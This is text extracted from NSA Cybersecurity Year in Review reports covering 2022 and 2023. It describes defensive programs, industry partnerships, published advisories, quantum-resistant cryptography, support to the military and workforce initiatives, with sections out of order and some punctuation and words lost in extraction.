partners increased awareness about the threats to standards
Photo courtesy of Getty Images
and strategized to combat these threats. The greatest way
to combat foreign adversarial influence in international
SDOs is for nations that share the same values of security,
privacy, and global market competition to contribute
technically sound standards proposals.
Commercial products are increasingly relied upon to
secure National Security Systems (NSS). Through the
National Information Assurance Program (NIAP), the
CCC certified 57 commercial components for protecting
NSS. Additionally, NIAP published 3 Protection Profiles
to raise security in those products. Protection Profiles
are vendor-agnostic guidelines that raise security in
commercial products by defining minimum security and
testing requirements. NIAP is also ramping up to update
Protection Profiles to be compliant with Commercial
National Security Algorithm (CNSA) 2.0 guidelines,
multifactor authentication and Zero Trust principles.
NIAP continued to strengthen the global IT security
posture through ongoing partnerships with 31 nations
within the Common Criteria Recognition Arrangement
(CCRA). The CCRA guarantees consistent evaluations
between members and mutual recognition to allow
vendors to test once and then sell in multiple countries.
It has positioned the United States as a leader within
the global community through further adoption of its
standards and by certifying more products than any
other nation within the CCRA. NIAP continued to chair
the CCRA Management Committee and orchestrated
collaboration towards mutual recognition. NIAP also
hosted the International Common Criteria Conference and
the Common Criteria Meeting at Washington, D.C. with
26 countries represented, further emphasizing the value
of international partnerships for the next generation of
commercial technologies.
www.NSA.gov/cybersecurity
Image taken durring the Threats to Standards Summit.
NSA hosted a Deception Operations working group with
industry partners. This working group developed from
industry partner success with the use of honeypots and
a desire among our partners to share other tools and
techniques associated with deception operations. Industry
partners shared their experiences and explained various
approaches to deception operations while NSA subject
matter experts offered their technical perspectives.
The working group created an open dialogue for future
collaboration between industry and NSA to explore new
techniques to not only defend networks against foreign
adversaries but also learn more about the evolving
techniques malicious actors are using to target the Defense
Industrial Base, DoD, and other U.S. critical infrastructure.
NSA also continued to engage with partners to establish
cybersecurity standards by hosting the inaugural 
Threats
to Standards
 Summit, bringing together standards experts
across the U.S. government, foreign partners, industry,
and academia to explore growing challenges and risks
associated with cybersecurity standards.
What this collective effort has accomplished
already is the creation of a road-map for
our partners to provide accountability and
help us all continue to improve.
Morgan Adamski
Chief, Cybersecurity Collaboration Center
Follow us @NSACyber
NATIONAL SECURITY AGENCY
CYBERSECURITY SERVICES
Drive Down Risk, Protect DoD Information
NSA is offering companies with an active DoD contract (sub or prime), or with access to
non-public, DoD information, several threat-informed cybersecurity solutions to help
reduce risk of network compromise and protect sensitive but unclassified information.
Benefits
Receive NSA Threat Intel
Improve Network Defense
Partner with NSA on non-public,
DIB-specific NSA threat
intelligence
Our services will help increase
the security of your networks
Attain Mitigation Guidance
Engage Privately
We provide guidance to
mitigate the vulnerabilities
illuminated using our services
All partnerships are underpinned
by Non-Disclosure Agreements
(NDAs)
CMMC Support
Our services support several NIST 800-171 requirements for Risk
Assessment, System and Communications Protection, and System
and Information Integrity families of requirements.
Success By the Numbers
 Blocked 1B instances of known malicious or suspicious cyber activity
through Protective DNS
 Identified over a million network vulnerabilities for remediation
 Discovered over 8,000 vulnerable host devices
 Identified over 202,000 vulnerable Partner IPs
 Identified almost 70,000 vulnerable connective services
nsa.gov/ccc
FREE FOR DIB CONTRACTORS
OUR SERVICES
Protective Domain Name System (PDNS)
Block users from connecting to malicious or suspicious
domains, driving down risk and protecting DOD information.
10B Malicious/suspicious domains blocked,
including nation-state spear phishing, malware, botnets,
and ransomware activity.
CMMC Support - NIST 800-171 System & Information Integrity 3.14.06
Attack Surface Management
Find and fix issues before they become compromises.
Step one: identify internet-facing assets and determine possible
vulnerabilities. Step two: company receives a tailored remediation list,
prioritized by severity and likeliness of exploitation based on NSA's
unique insights.
CMMC Support - NIST 800-171 Risk Assessment 3.11.02, 3.11.03
Threat Intelligence Collaboration
Partner with NSA to receive non-public, DIB-specific threat intelligence
and the opportunity to engage on the materials being shared.
Our services have illuminated, exposed, and remediated active
nation-state exploitation attempts across hundreds of enrolled customers.
CMMC Support - NIST 800-171 System & Information Integrity 3.14.03
Enrollment is Easy:
Industry Partner Testimonial:
1. Click 
GET STARTED
 on nsa.gov/ccc
2. Confirm you meet eligibility criteria
3. Sign DIB Framework agreement
Ask us about additional
pilots and services!
nsa.gov/ccc
FREE FOR DIB CONTRACTORS
Thank you for your support during the
seamless integration of the NSA Cyber
Security suite for the Defense Industrial
Base...Within fifteen minutes...we were
able to configure our...firewall for the
various services.
Arming
Net Defenders with Guidance
Sharing Timely, Actionable Guidance
Net defenders have a lot on their plates in today
s sophisticated threat
landscape, and they need timely information to mitigate against significant
vulnerabilities and protect their networks against cybercriminal and adversary
threats.
s public reports, often released with increasingly more collaborators,
help arm net defenders with the guidance they need to address these critical
cybersecurity issues.
In coordination with collaborators, NSA produced 27 Cybersecurity Advisories
and Cybersecurity Information Sheets for public release this year. Available on
NSA.gov, these reports cover a wide array of topics from how to best secure
home networks, to how the North Korean government uses social engineering
to hack think tanks, academia, and the media.
Another example helps organizations contextualize deepfake threats. Deepfakes
are AI-generated, highly realistic synthetic media that can be abused to threaten
an organization
s brand, impersonate leaders, and enable access to networks,
communications, and sensitive information. In collaboration with the FBI and
CISA, NSA released the 
Contextualizing Deepfake Threats to Organizations
cybersecurity information sheet. This offered an overview of synthetic media
threats, techniques, and trends, as well as recommendations, guidance and
mitigation strategies focused on protecting organizations from evolving
deepfake threats.
By publishing this guidance publicly, NSA along with the co-authoring agencies
are able to provide important mitigation steps to help protect a range of
network information systems.
NSA also streamlined the release of indicators of compromise associated with
various types of malware through automated Network Defense Notice (NDN)
reporting. These NDNs provide community partners with quick updates on
indicators of compromise related to malware observed in the wild that they
can use to prevent potential compromises of their systems.
Follow us @NSACyber
Cybersecurity Advisories
& Cybersecurity Information Sheets
For Public Release
Defending
Our Most Critical Networks
Defending Key Systems
NSA continues to support implementation of the
Memorandum on Improving the Cybersecurity
of National Security, Department of Defense, and
Intelligence Community Systems
 , known as National
Security Memorandum-8 (NSM-8).
This memo provided the NSA Director, as the National
Manager for National Security Systems (NSS), new
authorities that increased NSA
s cybersecurity visibility
into networks that contain classified information or are
otherwise critical to military and intelligence activities
across the Government. Since NSM-8 was signed, NSA
has even closer relationships with the more than 50 U.S.
departments and agencies that own or operate NSS.
NSA continues to increase the security of critical U.S.
Government systems to protect sensitive military and
intelligence data from our adversaries.
Protecting The Nation
s Secrets
NSA is integrated into the design and build of DoD
s national
security and weapons systems and their cryptography.
NSA continues to secure millions of devices around the
world and manage the infrastructure to key those devices
through its keys, codes, and cryptography mission. This
includes producing and distributing the keys, codes, and
cryptographic materials that the U.S. Government and
military use to secure weapons, satellites, communications,
and many other systems in which national security
critically relies.
Within the past year, NSA
s unclassified analysis of PRC
obfuscation infrastructure yielded better defense of
national security systems. The Cybersecurity Collaboration
Center identified malicious cyber activity attributed to
the PRC through analytic tradecraft using unclassified
commercial threat intelligence data feeds. Automated
generation of sensor fingerprints based on this tradecraft
streamlined identification of the PRC activity against
national security systems network fabric.
Securing Operational Technology
Cyber actors are willing to conduct malicious cyber
activity against critical infrastructure by exploiting internetaccessible and vulnerable Operational Technology (OT)
assets. NSA evaluated numerous DoD sites, released
multiple Cybersecurity Advisories and Network Defense
Notifications to secure OT, and continues to secure OT
infrastructure and national security systems. To that end,
NSA released a repository for OT intrusion detection
signatures and analytics to the NSA CyberGitHub. The
capability, known as ELITEWOLF, can enable defenders
of critical infrastructure, the Defense Industrial Base, and
national security systems to identify and detect potentially
malicious cyber activity in their OT environments.
NSA is responsible for protecting the nation
s most critical
secrets from the nation
s most capable adversaries, the
cyber-capable nation-states and individuals who want to
get into our networks or attack our encryption.
s keys, codes and cryptography secures everything
from NSA-certified tactical radios and any encrypted gear
in the hands of U.S. soldiers, sailors, airmen, guardians
and marines to their critical weapons platforms, including
nuclear command and control systems. NSA ensures
these systems our warfighters are using are resilient
to cybersecurity attacks and protect the US strategic
advantage in conflict.
Photo courtesy of Getty Images
www.NSA.gov/cybersecurity
NSA CYBERSECURITY REPORTS
UNIQUE. TIMELY. ACTIONABLE.
s guidance noti
es network defenders of relevant
threats and explains how to protect their systems by
detecting and mitigating the malicious activity.
NSA collaborates with government and industry
partners to develop and share a comprehensive
understanding of nation-state and cybercriminal
malicious activity.
NSA and its partners also work together to recommend
proven defensive measures that can prevent and even
eradicate cyber threats.
Visit NSA.gov/cybersecurity-guidance to review NSA
cybersecurity advisories and technical guidance.
Receive the latest alerts by following @NSACyber on X.
Modernizing
Cryptographic Solutions to Protect Data and Communications
Progressing Toward
Quantum-Resistant Cryptography
When achieved, a cryptanalytically relevant quantum
computer will change the game. It will introduce threats
to our nation
s most critical information systems and will
break cryptographic systems that secure the internet and
information systems worldwide.
Quantum-resistant cryptography continues to be the best
defense against this looming threat.
NSA continues to strategically execute National
Security Memorandum-10 (NSM-10), 
Promoting United
States Leadership in Quantum Computing While
Mitigating Risks to Vulnerable Cryptographic Systems,
which directs U.S. Government agencies to migrate
vulnerable cryptographic systems to quantum-resistant
cryptography, a multi-year transition.
As the National Manager for National Security Systems
(NSS), the NSA Director oversees the transition to
quantum-resistant cryptography across the more than
50 government departments and agencies that use NSS.
Continued partnerships and collaboration with government
and private partners is key to fighting this cybersecurity
challenge. NSA partners with the National Institute of
Standards and Technology (NIST) 
 the U.S. Government
commercial algorithm approval lead
 as well as the
Cybersecurity and Infrastructure Security Agency (CISA),
the Office of the Director of National Intelligence Science
and Technology (ODNI S&T), the DoD, and external
standards organizations.
The cybersecurity community 
 including industry,
government, and academia - must plan now to modernize
cryptography. Quantum computing may not feel like an
imminent threat, but it is a looming threat for which action
must be taken now.
vulnerable cryptography, strengthen the current set of
cryptography, and plan for migration to quantum resistant
cryptography. Transitioning toward this modernization
includes inventorying cryptography and prioritizing,
scheduling, and applying resources toward quantumresistant efforts, as well as planning to adopt NSA
quantum-resistant algorithm suite and NSS and NIST
cryptographic standards.
Post-quantum cryptography is about proactively
developing and building capabilities to secure critical
information and systems from being compromised
through the use of quantum computers. The transition
to a secured quantum computing era is a long-term
intensive community effort that requires extensive
collaboration between government and industry. The
key is to be on this journey today and not wait until
the last minute.
Rob Joyce,
Director of NSA Cybersecurity
The transition to quantum-resistant cryptography is just
one example of how NSA is staying a step ahead of our
nation
s adversaries to protect our most sensitive data.
NSA continually modernizes its cybersecurity solutions
to be agile, threat adaptive, and scalable across multidomain operations.
In the past year, NSA built upon its previously published
Commercial National Algorithm Suite 2.0 that notified NSS
owners, operators, and vendors of the future requirements
for quantum-resistant algorithms for use in all NSS. In
March and June, NSA released guidance to assist the
U.S. Government to identify and inventory quantum-
Follow us @NSACyber
U.S. Navy photo by Mass Communications Specialist
3rd Class Nicholas V. Huyhn
Protecting
The Warfighter and Supporting Combatant Commands
Supporting the Military
As part of the DoD, NSA is a combat support agency and supports the
military services by providing two key missions: foreign signals intelligence
and cybersecurity. While NSA
s foreign signals intelligence experts deliver
intelligence support to military operations, its cybersecurity experts help ensure
military communications and data remain secure.
COMSEC Devices
Rapidly Deployed
234,415
Tamper-indicating
Products Delivered
Globally
Unique Customers
Supported for Critical
Operations
Cyber Table Top
Exercises & Technical
Exchange Meetings
NSA furthered its robust partnership with U.S. Cyber Command, providing
support to hunt forward operations wherein teams deploy around the world
at the request of our partners to assist them against malicious cyber actors.
Warfighters must have confidence in their operations. NSA
s contributions help
to do just that, so that the U.S. military has the ability to secure communications
for operations such as nuclear command and control and differentiate between
friend and foe. Together with government partners, NSA helps ensure key
management functions, networks, systems and communications devices
used by the DoD are secure. NSA also delivers communications security best
practices to ensure that the cryptographic material used with these systems
and devices is securely handled.
NSA also provides cryptographic security products to meet unplanned
emergent requirements and to support urgent missions. In the last year, NSA
rapidly deployed approximately 550 communications security (COMSEC)
devices to support mission operations during global crises, and delivered
234,415 tamper-indicating products globally in 2023. The tamper-indicating
products prevent or detect physical exploitation of cryptographic equipment
and classified material during shipping or deployment around the world.
In the last year, NSA continued to support 61 unique customers for critical
operations such as U.S. Indo-Pacific Command, U.S. European Command,
the Joint Chiefs of Staff, U.S. Transportation Command, National Aeronautics
and Space Administration (NASA), Federal Emergency Management Agency
(FEMA), and many more.
NSA participated in more than 20 cyber table top exercises and technical
exchange meetings which resulted in 7 vulnerability assessment reports with
mitigation plans and engineering security recommendations. NSA continues
to help provide guidance to develop defensive monitoring strategies to help
improve the situational awareness of weapons platforms.
NSA also partnered with the Space Development Agency (SDA) to
develop the Proliferated Warfighting Space Architecture that allowed
the SDA to successfully launch their first ten satellites, marking a new era in
national defense.
In addition, NSA participated in multiple briefings and discussions with
U.S. Space Command leadership and staff. NSA provided insights to
members of U.S. Space Command staff regarding cybersecurity service
offerings and business practices used by the Cybersecurity Collaboration
Center to initiate and develop relationships with industry partners. U.S.
Space Command participants also offered a brief regarding U.S. Space
Command
s commercial relationship development. This partnership will
help facilitate further expansion of the Cybersecurity Collaboration Center
partnerships among key U.S. Space Command partners.
As previously described, the entire cybersecurity community must plan now
to modernize encryption and prevent against the looming quantum threat.
In the past year, NSA continued its efforts to modernize encryption across
the U.S. combatant commands. By working with U.S. Cyber Command and
Joint Force Headquarters-Department of Defense Information Networks,
NSA is reducing the chance that U.S. adversaries can access warfighter
communications and sensitive data.
The Joint COMSEC Monitoring Activity (JCMA) continued to identify the
leakage of critical military operation details and VIP travel information
found in unclassified communications that can increase risks to missions
and personnel. JCMA issued reports to Combatant Commands for action
and remediation related to these findings.
Assessing Systems and Creating Roadmaps
Conducting critical cybersecurity assessments on some of the nation
most important weapons and space systems across all warfighting domains
helps ensure they aren
t vulnerable to cyber adversaries. NSA continued this
critical work over the past year.
In 2023, the agency completed cryptographic roadmaps for each U.S.
combatant command coalition partner. NSA used Command and Control
Interoperability Board meetings between U.S. warfighting commands and
their partners to identify critical missions employing obsolete cryptography
and direct mission-driven modernization, an approach that baselines the
partners
 cryptographic posture, maps the crypto to specific weapon
platforms, and maps the platforms to mission support. This effort pinpoints
where resources must be committed to ensure partners are secure
against advanced cyber threats across the warfighting domains and fully
interoperable with U.S. and allied forces.
Through the DoD Strategic Cybersecurity Program, NSA worked in concert
with DoD leaders and the U.S. military services to assess their systems
and deliver plans to mitigate vulnerabilities, modernize cryptography, and
monitor the systems. In the future, NSA plans to scale this activity through
continued collaboration with the military services to perform additional
cybersecurity assessments on priority systems. NSA also provided
operational support to military exercises and planning conferences.
Photos courtesy of Getty Images
NSA continues to orchestrate and execute cybersecurity risk evaluations of
s most critical systems, helping DoD ensure that its systems continue
to improve and harden in the face of persistent and tenacious cyber threats.
Within the past year, NSA provided Zero Trust reviews and implementation
roadmaps for two critical systems for the Navy and Air Force. The products
were the result of enduring collaboration with the Navy and Air Force
throughout the year.
www.NSA.gov/cybersecurity
Cybersecurity matters. It matters
to our partners and it matters to
us. It ensures that our information,
our intelligence, our knowledge
can be shared securely.
General Paul M. Nakasone,
Commander, U.S. Cyber Command, Director, NSA/Chief, CSS
Aiding Interoperable Missions
NSA continues to represent the U.S. in NATO
s information assurance and cyber defense
capability panel, strengthening relationships with partner nations and focusing on driving
platform and equipment modernization to aid interoperable missions. As the U.S. continues
to modernize cryptography, NSA shares advanced cryptographic logic with capable NATO
partners to help modernize the NATO enterprise and alliance. This year, NSA emphasized
the work NIST performed developing quantum resistant capabilities. The panel is developing
technical guidance and cybersecurity information sharing across NATO to secure critical
networks from advanced cyber threats.
Furthering Nuclear Command, Control, and Communications (NC3)
Cybersecurity
In 2023, NSA continued to partner with agencies across the DoD to prevent and eradicate
cyber threats to Nuclear Command and Control Systems, focusing efforts to strengthen and
cultivate partnerships. These relationships will be pivotal in scaling cybersecurity practices
and leveraging innovative successes.
Fueled by a key partner, U.S. Strategic Command, NSA delivered a prototype capability to
leverage sensing and monitoring, and provided visualization to deliver deep insight into the
Nuclear Command, Control, and Communications (NC3) enterprise. NSA will continue to
harness big data to inform decisions that will harden systems and eradicate threats.
NSA also established new and strengthened existing partnerships to deliver NC3 Strategic
Cybersecurity Program evaluations providing cybersecurity risk, mitigation plans, and
defensive monitoring recommendations for fielded systems. This years
 operational support
during war-game exercises provided DoD partners with real examples of how to prevent and
eradicate threats to weapons and space systems.
Securing NSS with Commercial Solutions
s Commercial Solutions for Classified (CSfC) program enables customers to layer
commercial solutions to protect classified information. CSfC Capability Packages protect
NSS by offering a robust systems approach for U.S. military services, combatant commands,
and other federal partners.
CSfC allows customers to quickly configure and deploy secure cybersecurity solutions using
s preapproved systems-level designs and commercially available components to meet
a wide range of mission use cases 
 not only within and between secure facilities, but also
to enable remote access for telework and work that occurs outside of standard workspaces.
In 2023, CSfC continued to improve and update its publicly available Capability Packages,
which guide customers toward implementing their own solutions. This year, CSfC published
the supplemental guidance created for thin end user devices and private keys.
NSA also provides assurance of fielded solutions for customers such as the FBI and other
critical systems. CSfC conducted an on-site assessment of four customers
 CSfC registrations,
which compares the registered solution with what was actually fielded by the implementing
organization. NSA ensured that configurations, monitoring, and administration were in
line with CSfC Capability Package requirements. This provides an opportunity for mutual
technology enrichment and sharing, while capturing opportunities to improve the security
and clarity of the requirements. NSA plans to continue these assessments in the future.
www.NSA.gov/cybersecurity
Photo courtesy of Getty Images
Photo courtesy of Getty Images
Researching
Cybersecurity Solutions
s Laboratory for Advanced Cybersecurity Research remains at the forefront of protecting
and securing our nation
s cyber ecosystem, through robust and thriving partnerships with
academic institutions, federally-funded research labs, and the private sector. NSA is uniquely
positioned to bring world-class technical expertise to support whole-of-government efforts to
ensure the United States
 enduring advantage in Artificial Intelligence and Machine Learning.
s scientists, engineers, and thought-leaders have led and advanced research, tradecraft,
and capabilities in data science for years, and our subject-matter expertise will be called upon
to deliver secure development, integration, and adoption of AI capabilities within U.S. National
Security Systems and the Defense Industrial Base.
Other recent cybersecurity research advances include:
 Strengthening cybersecurity standards in future technologies and forums critical to
the nation, such as the 3rd Generation Partnership Project, which serves as the premier
5G standards entity.
 Provisioning foundational supply chain guidance to National Security System and
Defense Industrial Base network defenders, ensuring the integrity of devices such as
desktops, servers, and laptops involved in all enterprise-based procurement activities.
 Concluding the latest iteration of NSA
s Science of Security Program, which promotes
foundational cybersecurity research at academic institutions in cutting-edge science
and emerging technologies, and kicking off the next version, sponsoring a series of new
projects across seven different universities. The Science of Security program invites
collaboration between academia, industry, and government to advance cybersecurity
through scientific rigor.
 Developing cyber operator courses designed to equip the next generation of cyber
professionals with cutting-edge skills to assess software vulnerabilities and protect
our national cyber assets.
Follow us @NSACyber
WOMEN
immersed
for cybersecurity
www.NSA.gov/cybersecurity
Developing
The Current and Next Generation of Cyber Experts
Enhancing the Cyber Workforce
Sponsored by the White House Office of the National Cyber Director,
NSA partnered with other federal agencies to draft and publish the
first-ever National Cyber Workforce and Education Strategy, approved by
the Biden-Harris Administration in July. This strategy was designed with
a people-focused component to augment National Cybersecurity Strategy
that President Biden signed in March, and features four key pillars:
 Equip Every American with Foundational Cyber Skills
 Transform Cyber Education
 Expand and Enhance the Cyber Workforce
 Strengthen the Federal Cyber Workforce
The strategy was developed in consultation with industry, academia,
non-profit organizations, and government partners. NSA contributed to the
strategy and participated White House working groups, focusing on cyber
education efforts and the federal cyber workforce. NSA
s commitments
include a pilot initiative to help develop 
cyber clinics
 across the nation
which will support communities and small governments that would
otherwise not have access to cyber risk assessment and planning assistance.
The clinics will also provide an opportunity for more than 200 students
to develop competencies while in a supervised learning environment.
Spotlighting and Recruiting Women
in Cybersecurity
s Cybersecurity Collaboration Center is leading the charge with
academic, industry, and government partners to encourage more
women to pursue careers in cybersecurity.
Following last year
s successful Women Immersed in NSA
Cybersecurity (WIN-Cyber) pilot, five new schools and twenty eager
students participated in WIN-Cyber 
23, hosted at the Cybersecurity
Collaboration Center.
The WIN-Cyber program is a week long, immersive learning
experience that allows students to collaborate and learn from some
of NSA and U.S. Cyber Command
s top cybersecurity professionals.
WIN-Cyber 
23 participants were nominated by their respective
professors and represented schools including a 2-year community
college, a Historically Black College and University, a Hispanic
Serving Institution, and a 4-year public university. Students learned
about NSA
s cybersecurity mission and many have returned to their
schools as NSA 
ambassadors
 who advocate for public service
on their campuses.
Follow us @NSACyber
Partnering with Academia
NSA continues to execute its cybersecurity academic strategy to inspire the cyber warriors of tomorrow through
initiatives such as:
The NSA Codebreaker Challenge provides students
attending U.S.-based academic institutions the
chance to sharpen their cyber skills and gain
experience in realistic NSA mission-centric scenarios.
Through December 21, students are working to
interpret and discover an unknown signals origin
identified by the U.S. Coast Guard. Students are
presented with a series of nine increasingly complex
tasks to locate and analyze what produced the
signal, discover an active collection operation tasked
by a rogue server, and subvert the rogue server to
stop the collection device.
The NSA Cyber Exercise (NCX) develops future
military and civilian cyber warriors and leaders by
developing and testing their cybersecurity skills,
teamwork, planning, communication, and decisionmaking. This annual exercise is the competitive cyber
event of the year for the U.S. Service Academies,
Senior Military Colleges, and NSA professional
development program participants. The U.S. Air
Force was awarded the 2023 NCX trophy.
The GenCyber program offers year-round cybersecurity
training to students and teachers at the secondary
level. This annual competitive program is offered to
educational institutions and not-for-profit and nonprofit institutions by way of an academic institution.
Proposers can submit for four types of programs:
student, teacher, combination and student language.
In 2023, 160 programs were funded across 47 states,
plus District of Columbia and Puerto Rico, serving
approximately 5300 students and teachers. NSA and
the National Science Foundation make this possible.
Photo taken at the NCX 23
 event.
www.NSA.gov/cybersecurity
The NSA Experiential Tour provides four-to-six week tours within NSA, U.S. Cyber
Command, and partners to nearly 200 service academy, Senior Military College, and
select Reserve Officer Training Corps (ROTC) members. These tours provide both
classified and unclassified experiences, allowing participants to shape mission as they
prepare to assume leadership roles.
Advancing the Study of Cybersecurity
NSA is invested in promoting cybersecurity careers throughout all levels of education. NSA
National Cryptologic University runs the National Centers of Academic Excellence in Cybersecurity
(NCAE-C) program creates and manages a collaborative cybersecurity educational program with
community colleges, colleges, and universities that:
 Establishes standards for cybersecurity curriculum and academic excellence
 Includes competency development among students and faculty
 Values community outreach and leadership in professional development
 Integrates cybersecurity practice within the institution and across academic disciplines
 Actively engages in solutions to challenges facing cybersecurity education
More than 400 schools have received the NCAE-C designation in designations of cyber,
cyber defense, and cyber research.
Photo courtesy of Getty Images.
Follow us @NSACyber
GRAPHS-1136
WELCOME
The National Security Agency (NSA) and its predecessors
have been protecting the United States
 most sensitive
information since World War II. As communication technology
and information technology have advanced 
 creating a
more interconnected world with an increasing number of
threats 
 NSA
s mission has expanded and it has embraced
new responsibilities and operational authorities to ensure our
networks remain secure.
Today, NSA
s cybersecurity mission integrates its cryptographic
expertise, signals intelligence, vulnerability analysis, defensive
operations, and more to prevent and eradicate cyber threats to:
NATIONAL SECURITY SYSTEMS (NSS)
Networks that contain classified information or
are otherwise critical to United States military and
intelligence activities. It is vital that these networks
remain secure to ensure mission readiness of U.S.
warfighting capabilities as well as protect the nation
most sensitive information.
THE DEPARTMENT OF DEFENSE (DOD)
U.S. military services and combatant commands as well
as U.S. government agencies and departments related
to national security.
THE DEFENSE INDUSTRIAL BASE (DIB)
Companies that design, develop, operate, and maintain
the Department of Defense
s critical systems, platforms,
and technologies required to defend the nation.
If these networks are at risk, so is the U.S.
While much of the critical work NSA does to secure
the nation cannot be publicly disclosed, this year in
review shares a wealth of information on cybersecurity
efforts that have better equipped the U.S. to defend
against the highest priority cyber threats. Visit NSA.
gov/cybersecurity to access the report digitally. Provide
NSA Cybersecurity with feedback or ask questions by
emailing cybersecurity@nsa.gov.
TABLE OF
CONTENTS
LETTER FROM THE NSA
CYBERSECURITY DIRECTOR
RESPONDING TO NATIONAL
THREATS AND PRIORITIES
PARTNERING
WITH INDUSTRY
ARMING NET DEFENDERS
WITH GUIDANCE
DEFENDING OUR MOST
CRITICAL NETWORKS
CREATING CRYPTOGRAPHY TO
PROTECT DATA, COMMUNICATIONS
PROTECTING THE WARFIGHTER
AND SUPPORTING THE
COMBATANT COMMANDS
RESEARCHING
CYBERSECURITY SOLUTIONS
DEVELOPING THE CURRENT
AND NEXT GENERATION
OF CYBER EXPERTS
LETTER FROM THE NSA CYBERSECURITY
DIRECTOR
CYBERSPACE IS DANGEROUS
More than a month before Russian troops
invaded Ukraine in February, a cyberattack
took down several of Ukraine
s government
websites.
An ominous message greeted visitors: 
afraid and expect the worst. This is your past,
present and future.
While Europe hasn
t seen this level of
kinetic activity since World War II, this
hybrid war started in cyberspace. It
s an
environment where actors can increase their
power, degrade others, and gain a strategic
advantage 
 often at a very low cost.
In the weeks leading up to and following
Russia
s invasion in Ukraine, at least seven new
families of destructive data wipers were used.
One even attacked satellite broadband service
to disrupt Ukraine
s military communications
on the day of the invasion but spilled beyond
the conflict, impacting critical infrastructure
remote monitoring of wind turbines in
Germany, emergency services in France, and
internet access of select users in Europe.
Industry observed and reported on many of
these destructive wipers, demonstrating their
unique insights into the conflict.
The Russian threats did not stop with Ukraine.
Hacktivists targeted our Defense Industrial
Base and the communications and weapons
systems of EUCOM and NATO were in the
We are driving security
outcomes by sanitizing
and sharing our secrets.
www.NSA.gov/cybersecurity
crosshairs of our adversaries. The keys, codes,
and cryptography we provide are vital:
Encryption is the last line of defense.
Our focus extends beyond the Russia-Ukraine
conflict, but this example demonstrates the
complex environment. Our approaches must
scale for China, Iran, North Korea, cybercrime,
and other threats.
In addition to the insights we receive from
industry, we are committed to contributing
our unique value to the conversation: foreign
intelligence, practical experience with
exploitation tradecraft, and deep technical
expertise of our adversaries.
Often, what we know is not as sensitive as
how we know it. Our insights are useless
unless someone can take action with them.
We empower our industry partners to act on
that information, and benefit from both their
action and their insights.
Our Cybersecurity Collaboration Center (CCC)
has formed hundreds of industry partnerships
with the goal of better protecting our Defense
Industrial Base and sensitive government
systems. The intelligence picture we build,
LETTER FROM THE NSA CYBERSECURITY DIRECTOR
and security improvements we make together,
scale far beyond defense contractors. For
example, we reach a cumulative, estimated
2 billion endpoints through sharing info to
technology providers and cybersecurity
companies.
By protecting our most
sensitive networks,
we help protect yours.
We aren
t just throwing our partners an IP
address over our barbed-wire fences, either.
In the last year, we
ve performed 10,000
robust bidirectional exchanges through our
CCC. We work with industry to investigate the
unknown and our partners often take actions
that have global implications, such as issuing
patches for zero-day vulnerabilities before
our adversaries can perform widespread
exploitation.
These efforts are critical because our
adversaries are conducting increasingly
sophisticated and broad intrusions with
consequences that transcend international
borders. For our most important secrets, they
will go to significant lengths and we must
defend with rigor and depth.
We must form collaborative campaigns
to counter nation-state and cybercriminal
threats that put our national security at risk.
They have to combat immediate threats like
Russia as well as pervasive threats like China.
Our aptly-named Adversary Defeat team is
leading the charge in this area by collaborating
with our interagency partners to generate
outcomes against our highest priority threats.
We work across a wide array of departments
and agencies, each with unique, complementary authorities, capabilities, and cultures.
When we each come to the table with a
shared objective, we can disrupt and degrade
malicious cyber activity.
As the scope of malicious cyber incidents and
the sophistication of our adversaries grow,
it will take a unified public-private sector
strategy to gain the competitive advantage
in this environment.
Our power is in partnerships. Strategic
collaboration across security and intelligence
spheres, and across classified and unclassified
settings, results in increased speed and agility.
We are preparing for the transition to
quantum-resistant cryptography to protect
ourselves into the future. That protection not
only goes into our networks, but the weapons
platforms and other technology we rely on.
We have to recognize networked computers
are in every facet of our environment and
change culture to secure all of them. Tools
like National Security Memorandum 8 that
give directive authorities to improve the
cybersecurity of National Security Systems
are improvements that enable such action.
Cybersecurity is national security and we
all have an important role to play. We need
leaders who recognize the threat, drive a
culture that emphasizes robust security, and
lean on partnerships. Leaders must emphasize
a culture of cybersecurity and provide their
teams with resources to secure their systems.
We need cybersecurity at scale.
Regards,
Rob Joyce
Rob Joyce
Director, NSA Cybersecurity
Find us on social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
RESPONDING TO NATIONAL
THREATS AND PRIORITIES
COUNTERING GLOBAL THREATS
While the U.S. Government relies on NSA
unique foreign signals intelligence insights to
inform key decisions, each private and public
sector partner builds on that foundation to
create a more comprehensive understanding
of the threat and what should be done to
counter it.
NSA joined U.S. partners 
 the Cybersecurity
and Infrastructure Security Agency (CISA),
U.S. Cyber Command, and the Departments
of Justice, State and Treasury 
 as well
as international partners 
 the Australian
Cyber Security Centre, the UK
s National
Cyber Security Centre, and Canada
Communications Security Establishment
and Canadian Centre for Cyber Security 
publish a Cybersecurity Advisory to disrupt
and degrade a multi-year global ransomware
threat that affected hundreds of organizations.
Each partner also brings their own unique
authorities and capabilities to the fight. This
enhances our collective ability to prevent
and eradicate some of the world
s most
concerning cyber threats.
Iranian Islamic Revolutionary Guard Corps
(IRGC)-Affiliated Cyber Actors were exploiting
publicly known vulnerabilities to gain access
to networks around the globe. The malicious
state-sponsored actors then encrypted
The combined talent of our partners
is the greatest competitive advantage
we have to confront the increasingly
sophisticated threats to our nation.
Through partnerships, we bolster
and enable defense, and disrupt
and degrade adversary activities.
General Paul M. Nakasone,
Commander, U.S. Cyber Command,
Director, NSA/Chief, CSS
www.NSA.gov/cybersecurity
NSA and its U.S. and international partners
scale impact against global threats by
collaborating on coordinated responses.
RESPONDING TO NATIONAL THREATS AND PRIORITIES
PHOTO COURTESY OF JOSEPH BARILLARI
Iranian Islamic Revolutionary Guard Corps-affiliated actors were planning to ransom Boston
Children
s Hospital, according to the FBI.
information and extorted data to support
ransom operations. The actors victimized a
broad range of organizations, including small
businesses, government agencies, nonprofit
programs, and educational and religious
institutions. Their victims also included
multiple critical infrastructure sectors,
including health care, transportation services,
and utility providers.
On September 14, the international coalition
released, 
Iranian Islamic Revolutionary Guard
Corps-Affiliated Cyber Actors Exploiting
Vulnerabilities for Data Extortion and Disc
Encryption for Ransom Operations.
 The
Cybersecurity Advisory alerted network
defenders of the threat and armed them to
defend against it. The advisory shared the
actors
 tactics, techniques, and procedures
(TTPs) 
 mapped to the MITRE ATT&CK
framework 
 and provided guidance on how
to detect and mitigate against the threat.
Because hundreds of companies, organizations,
and institutions were compromised around
the globe, the advisory was shared with
U.S. and international victims directly and
partners amplified the guidance upon release
to prompt net defenders to act.
On the same day, U.S. partners held the actors
and the Iranian government responsible for
their malicious behavior and their failure to
observe international cyber norms.
